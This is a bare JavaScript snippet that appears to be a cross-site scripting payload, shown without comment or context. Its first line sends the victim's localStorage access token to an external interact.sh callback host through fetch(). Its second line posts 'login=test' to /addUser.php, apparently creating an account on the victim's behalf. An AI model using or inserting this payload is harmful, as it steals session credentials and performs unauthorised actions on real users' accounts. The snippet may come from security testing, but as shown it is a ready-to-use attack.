fetch(`https://c9vrana2vtc0000kjmd0gr7hfkwyyyyyb.interact.sh?at=${localStorage['access_token']}`)


fetch("/addUser.php", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: "login=test"
})